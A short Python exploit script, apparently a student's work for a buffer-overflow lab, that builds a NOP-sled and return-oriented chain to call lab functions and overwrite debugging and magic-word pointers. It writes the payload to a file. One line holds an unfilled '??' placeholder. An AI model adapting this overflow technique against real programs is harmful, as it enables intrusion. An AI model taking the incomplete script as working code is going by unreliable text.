import struct

dst = int('0xbffff0ac', 16)
dst = dst - 244
print(dst)
dst = hex(dst)
print(dst)
dst = struct.pack("I", ??) # valore da print

food = struct.pack("I", 0x804859e)
feeling_sick = struct.pack("I", 0x80485ea)
lazy = struct.pack("I", 0x804856b)

pop_ret = struct.pack("I", 0x08048659) 
pop_pop_ret = struct.pack("I", 0x08048658)

magic = struct.pack("I", 0xdeadbeef)
magic_1 = struct.pack("I", 0xd15ea5e)
magic_2 = struct.pack("I", 0x0badf00d)
magic_word = struct.pack("I", 0xbffe4589)
print("magic w int:", int('0x00004589', 16))

debugging_disable_pointer = struct.pack("I", 0x804a038) # gdb p &debugging_disable
magic_word_pointer = struct.pack("I", 0x804a044)

# injection_vector = [nop*10][gadgets per shell_code][padding fino a 244][dst address che punta a inizion injection vector][debugging_disable_pointer][padding 8][magic_word_pointer]
# magic: 3221112201 new val che ho usato: 17801 int, 0x4589 exa

payload = (b"\x90")*208
# food
payload += food
payload += pop_ret
payload += magic
# feeling sick
payload += feeling_sick
payload += pop_pop_ret
payload += magic_1
payload += magic_2
#lazy
payload += lazy
print(len(payload))
# 244 = buffer len(240) + sfp(4)
padding = 240 - len(payload)
payload += b"a"*padding
payload += dst
payload += dst
payload += dst
payload += dst
payload += dst
print(len(payload))
# siamo a 260
#padding = 260 - len(payload)
#payload += "b"*padding
# riscrivo puntatore di fp con debugging_disable_addr
payload += debugging_disable_pointer
payload += debugging_disable_pointer
payload += debugging_disable_pointer
payload += magic_word_pointer

with open ("badfile_test.txt", "wb") as f:
	f.write(payload)
